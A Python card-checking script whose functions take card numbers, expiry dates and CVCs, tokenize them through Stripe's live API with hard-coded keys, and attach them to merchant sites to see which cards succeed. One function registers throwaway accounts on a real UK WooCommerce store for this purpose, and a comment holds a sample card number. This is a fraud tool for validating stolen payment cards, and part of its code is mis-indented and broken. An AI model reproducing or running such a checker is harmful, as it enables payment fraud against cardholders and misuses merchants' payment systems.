import requests
import requests,os,re,user_agent,json,random,string
import requests,re,base64
import os,time
os.chdir(os.path.dirname(os.path.abspath(__file__)))



def stch(ccx):
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if len(mm) == 1:
        mm = '0' + mm
        mm = str(mm)
    if "20" in yy:
        yy = yy.split("20")[1]
    yy='20'+yy

    bi = n[0:1]
    if "3" in bi:
        cvc = cvc[0:4]
    else:
        cvc = cvc[0:3]
    pk = "pk_live_51SQ9lR2HyxIGtIg1RtYPFH5eJ0yREfwaAHBeoP7KKTSS19sAUoYQPE2QU2TBiowosTwemHCnWR3hqawGnZ4rbQZR00LyFJDmnk"

    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=43d49d9f-4a6b-41f0-aefb-8f91e694862860328f&sid=69756621-b257-4f8c-b637-7b15e4025bf187f4bb&pasted_fields=number&payment_user_agent=stripe.js%2F5b41d96414%3B+stripe-js-v3%2F5b41d96414%3B+card-element&referrer=https%3A%2F%2Fcardzone.gamer.gd&time_on_page=15564&client_attribution_metadata[client_session_id]=34f07098-eb27-47fb-b926-1eb91e6d2951&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk}'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
#    print(response.text)
    try:
        ide = (response.json()["id"])
        #print(ide)
    except:
        time.sleep(10)
        return (response.json()["error"]["message"])
        pass
    
    cookies = {
        '__stripe_mid': '43d49d9f-4a6b-41f0-aefb-8f91e694862860328f',
        '__test': 'bcd924d9a84b55853dc2833f9ac5338a',
        '__stripe_sid': '250defef-af12-46b7-9520-6cf3c4b6147337380d',
    }

    headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://cardzone.gamer.gd',
            'Referer': 'https://cardzone.gamer.gd/?i=1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            # 'Cookie': '__test=629ae91d842ac0ed5231715eeadac946; PHPSESSID=c949250a14f6162d8c955264f122bfc0; __stripe_mid=43d49d9f-4a6b-41f0-aefb-8f91e694862860328f; __stripe_sid=69756621-b257-4f8c-b637-7b15e4025bf187f4bb',
        }

    json_data = {
            'pm': ide,
        }

    response = requests.post('https://cardzone.gamer.gd/save_card.php', cookies=cookies, headers=headers, json=json_data)
#    print(response.text)
    time.sleep(10)
    try:
        return response.json()["message"]
    except:
        return response.text


def stau(ccx):
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if len(mm) == 1:
        mm = '0' + mm
        mm = str(mm)
    if "20" in yy:
        yy = yy.split("20")[1]
    yy='20'+yy

    bi = n[0:1]
    if "3" in bi:
        cvc = cvc[0:4]
    else:
        cvc = cvc[0:3]
    pk = "pk_live_51SQ9lR2HyxIGtIg1RtYPFH5eJ0yREfwaAHBeoP7KKTSS19sAUoYQPE2QU2TBiowosTwemHCnWR3hqawGnZ4rbQZR00LyFJDmnk"

    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=43d49d9f-4a6b-41f0-aefb-8f91e694862860328f&sid=69756621-b257-4f8c-b637-7b15e4025bf187f4bb&pasted_fields=number&payment_user_agent=stripe.js%2F5b41d96414%3B+stripe-js-v3%2F5b41d96414%3B+card-element&referrer=https%3A%2F%2Fcardzone.gamer.gd&time_on_page=15564&client_attribution_metadata[client_session_id]=34f07098-eb27-47fb-b926-1eb91e6d2951&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk}'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

#    print(response.text)
    try:
        ide = (response.json()["id"])
#        print(ide)
    except:
        time.sleep(10)
        return (response.json()["error"]["message"])
        pass
	
	cookies = {
    '__stripe_mid': 'f47bdda4-03bd-4f7b-83ee-13f0540db213b99b49',
    '__test': 'a3d25e1987dc33989d1b872038a8171f',
    '__stripe_sid': '7d1b0bc3-de4d-4edb-b773-df60378a1b534df328',
}
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://domad.kesug.com/',
        'Referer': 'https://domad.kesug.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'pm': ide,
    }

    response = requests.post('https://domad.kesug.com/save_card.php', cookies=cookies, headers=headers, json=json_data)

#    print(response.text)
    time.sleep(10)
    try:
        return response.json()["message"]
    except:
        return response.text


def stau2(ccx):
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if len(mm) == 1:
        mm = '0' + mm
        mm = str(mm)
    if "20" in yy:
        yy = yy.split("20")[1]
    yy='20'+yy

    bi = n[0:1]
    if "3" in bi:
        cvc = cvc[0:4]
    else:
        cvc = cvc[0:3]
    letters = random.sample(string.ascii_lowercase, 20)
    code = ''.join(letters)
    r = requests.session()
    user = user_agent.generate_user_agent()
    headers = {
	    'authority': 'www.beechridgefarm.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'max-age=0',#
	'referer': 'https://www.beechridgefarm.co.uk/',
	    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent':user,
	}
    response = r.get('https://www.beechridgefarm.co.uk/my-account/', cookies=r.cookies, headers=headers)
    logen = re.search(r'woocommerce-register-nonce" value="(.*?)"' , response.text).group(1)
    headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.beechridgefarm.co.uk',
	    'priority': 'u=0, i',
	    'referer': 'https://www.beechridgefarm.co.uk/',
	    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent':user,
	}
    data = {
	    'email':code+'@gmail.com',
	    'password': 'a5CpiRD4yEnuVWE',
	    'mailchimp_woocommerce_newsletter': '1',
	    'mailchimp_woocommerce_gdpr[75f1af8eb1]': '0',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_utm_source_platform': '(none)',
	    'wc_order_attribution_utm_creative_format': '(none)',
	    'wc_order_attribution_utm_marketing_tactic': '(none)',
	    'wc_order_attribution_session_entry': 'https://www.beechridgefarm.co.uk/',
	    'wc_order_attribution_session_start_time': '2025-11-17 19:30:52',
	    'wc_order_attribution_session_pages': '1',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent':user,
	    'woocommerce-register-nonce':logen,
	    '_wp_http_referer': '/',
	    'register': 'Register',
	}
    response = r.post('https://www.beechridgefarm.co.uk/', cookies=r.cookies, headers=headers, data=data)
    headers = {
	    'authority': 'www.beechridgefarm.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',#
	    'referer': 'https://www.beechridgefarm.co.uk/my-account/add-payment-method/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent':user,
	}
    response = r.get('https://www.beechridgefarm.co.uk/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
    nonce = re.search(r'createAndConfirmSetupIntentNonce":"(.*?)"' , response.text).group(1)
    headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent':user,
	}
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F5127fc55bb%3B+stripe-js-v3%2F5127fc55bb%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fwww.beechridgefarm.co.uk&time_on_page=463725&client_attribution_metadata[client_session_id]=f2e75b6a-058d-42a5-a160-28eb85d71bf5&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=eee7f5ac-93e6-4bbf-9d65-58c030ac98f1&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=341ccc5e-8279-460f-8b0b-d1d1ccccfd8bd67264&muid=9914f779-6265-417d-8379-e6aca82c312f03d19f&sid=c03ac7b4-b05a-4adf-861a-e38c396a6e5ea6921a&key=pk_live_51O0gazLqxDrAOl8TUh6wZBoAJwuH01oYEsesVdc7rEFuZ2CpgpsqBljSmZBWDMfybFUcMYeH5PR58UfZOsKdxYqJ00UDehJCnb&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYzMzk1Mjg3LCJjZGF0YSI6IjUrc3dlby84Y2NXSHBwMGtOcDlmUExIdVV4Z0c0bXgyVGs1NzFxaWhnZTR1aHFWaGp6b1ViZi9iWlh6aDgrZndwd1FpQmwrTVNPeWZuS3AxVmdQMUQ2bW90YkovblUzUk5WYWRxY3RUWlpCTkxCWW5HR3ZJY3p2OWpnYXpNYVJyN1o2dGlsSjNIWUpCQjV6VnF0b3FxS3BXaVl5eXpqdHhSQnNHaVEzdjZXd1FoeWtxM2tPVEZyQkdxOVdFSWRVdE1YY21VZkMyWW91a0ZNelkiLCJwYXNza2V5IjoiYlVPZE5LRVIwckNyTGpzL3pscmdlRy9WWEFPQ0JoUGRLb1NaUGIzQVBGZ2Ird0NBVjF6andqclZCcXVkMVdKemhvYUJQWmRjWTErSnBIM2VHNjdkK0VBRkNnbUE3L1h2KzdWdW0yY2JTNUUwNWtuUkx4aEtEcUROQXE2L2JlNytLaXlTRlJzWW80Q3R4K3VZUUxmNGxPSWZINEtmVzFKWkZmdnVrMUh4VXZqdEIrN0ovK2FOY3FOSEk1eDVjL3hqakdNdExoUSttbDA1N1lteE9aTGlEd05Fc0tBYlpNUzhXRTdTYXdKMmtTVGVoUHVNWGxHTlNod0xWWkVDY1hSWEw0bWRqcUwwRXNxdGZYZjRDWU51SlgrcG41UCtVZjdiSnloemYvZkNZTHE5TEhadGE5bXBGVU9tQVhud0VzWUlvUENwVnc4WU11OWhZZkRpbHJQaDR4L3YvdUxCUUkrRVltcmVyb1d0dlArMEQwcjY5Slp1SmF6SHNEWTh3VGlNeFpyMElnazFQV2lCc3F2R2lCR0x1ZlBMSHN6TDJydmx5dTlsd2VIZXI5VjB0U3lPd2RwYk5PMis4dlNzRzNDa2prSG0xWVJtR0lEQzRqUENJbHk3NGdzalZqaDM4ZEg3aXRZWmtjQXg3am9aekdiTVhiQ3NaLzBtdjZONnd3N3cwdFFoZ3IrdVp0eDhSREdpb0VITnR2WHdoYTVkWU5WZnhaOGMzS1ZPcnhBSUdlZExYTldETmJFM2JDRDkzN0svTG5JZ0VyaG5WakhKTFBlV0dOOXA5b3pLSEN2Q2VrRTd4emJtNTRQa2FiWTlFaVdvcTVhK05LUFRQR3h4eUxjOTFVYmc3Qmh3MmNJblpWYi9sUHZDdyt1MUZmRmcwR094bnd6K05jZ3o5S2t4bEEyNkU5UEFwQzkzVlNpRGR2TVdTRVdGTnVOSXpKa3k0RVYrSk5KdC9LcmUxZ3NWS3dUNlJOeU9tcFBEcldNdWE3Qlc4Z0tTUE5PUHNNdHpSUS9yTnBQcWZZbGU5enVXa3BHRWEzTnJxc3REUnAxRzFSS3ZLZ01MNXVqVFBhTmFoTHZoODBUYmNVTENYZU9oS1FWbzNjMmNQclVtejBsd3VEcGlaMDFMeUR0WmI5elpJeVZib0l1R1hERlVtYllNSi9rdFZveXBMQUJjNTJqdFRrSGh2elpnZVp5T3RzazlIT1Q1bFJ5bmpIVEYxQmMzQ1RlcEdRYy9Xd3grK1hUL2lMN0Q5aS9Hb1pOdDF0UDBXTkxmQU5sNTV2dUJXemxONEdjYUMybDJiSVFXOVhDN1hGMEZ1UnBRaHU2SEJkWVBUaDZ0TFg0TElwbE5QU3cyTDZSbGpsWlRBM29ZUlI1U1BNUzk1WDlrTVpjK2NweTMzR3lIVCtML0MyQzdZNDJmaXN1L2NDUUhyanp0MThIZDNHblYzYTNSeE1BVUVOWFhBelpkNlM0OVVNeFk2ZDY3b0JERE55Uyt2Q2d2ZlQ0Tm1adEpETm5HaHRVTEZzT2EvdVZJZUJoVzZtM1c4YlZpTHhxMXowNkdOY2ljL3VqV2JwQUVNTEUzeTd3TEFhVUdQZGw3Q1VUdURoYkI3OW1MR3F3aWxRVjhCQ3BhSDBpL0FtNHpGR1dJazBua1RIYlovdTBJZFJIY3NWZFNTc1BDWEV0SS83NEY4bGpkTHV5U0JnU3RPVThtSC84UUdHWHExNHFmOEpnd1JQV1lqQjlubEpCQTlRbHZBbU82Y04rU0sxVEk3QUhWZ1pJbE9RRlplMTlONURTdTBqZzloMEJLN08vQWN5MzhFVk41czBLN0swYTVIWk96U2EwclpKOExlMFpZcWgzN0tXMHZKcGI5ZFA0WjBZVk5jRjgxWVQ2RHc2T2dDTWZMNWpDTVBSZXhLM0RtZlhOZUlZaXRHY2JRWFFPODY5cFYrQU14YXlkaXhOOWVjalNwRklyaUhOQ0V2bHJPbnh1azg4WlNadlBuV0EyNmlSRjdyTzR4UTZDUmdsWG5za2lDaXhuYXg5bmI0VzV5MHpURGVLTzVJa1JISnV2NVh6K0ZsaXdBdWhNZHQ2a2lyWXpkU094dkI4UDFZLzBYSWpaQ3JTQ1NlSlYySVkvRUMyZlFmcllVRWNDcmYxTkJiT1RiL05KWkxDb000WjhRWi9iT2VabGQyekVVRExPckZ0ZUNYbDBsRmZjOG5Mb3ovOW9VT3o4bUVmR3hiQ3R5MHJDazVPekxxMkNMZlJrNGpoSHgveldCdFBTSVFqNnFseFBCbFBaZTc3NVZpTm1ha2Q3eGdzaEFIaG9EYkpHcVZsQUdyLy91UG1Hcm1tcXVuemRBWC9YWmthMjZ1UzBsbFFpODJidDlZK0JQMzJrR09aZENkdXFBSlVNdW9zVm1uZDE1c1VZa2dVUlF1ckVQZ0RQOHQ4MnZiVStleVVmenZVUXdjS1NLMFhKeDJYV2ZaaTVTOWVsNjlvL2U2MUw2bDdIR1NKb1dGK3d0L3c9PSIsImtyIjoiM2MwNTU0MGEiLCJzaGFyZF9pZCI6MzM5NTEwMzAzfQ.xj67sE6YasBMCbFDcbvzUy9cenuq484w6oEhOJ4bbHA'
    response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
        ide = response.json()['id']
    except:
        ide2 = (response.json()['error']['message'])
    try:
        headers = {
		    'authority': 'www.beechridgefarm.co.uk',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9',
		    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',#
		    'origin': 'https://www.beechridgefarm.co.uk',
		    'referer': 'https://www.beechridgefarm.co.uk/my-account/add-payment-method/',
		    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent':user,
		    'x-requested-with': 'XMLHttpRequest',
		}
        data = {
		    'action': 'wc_stripe_create_and_confirm_setup_intent',
		    'wc-stripe-payment-method':ide,
		    'wc-stripe-payment-type': 'card',
		    '_ajax_nonce': nonce,
		}
        response = r.post('https://www.beechridgefarm.co.uk/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
        #print(response.text)
        try:
            return (response.json()['data']['error']['message'])
        except:
            req = response.json()['data']['status']
            if 'succeeded' in req:
                return 'succeeded'
            else:
                return req
    except:
        return ide2

#stau('6011006942536849|11|25|377')
###
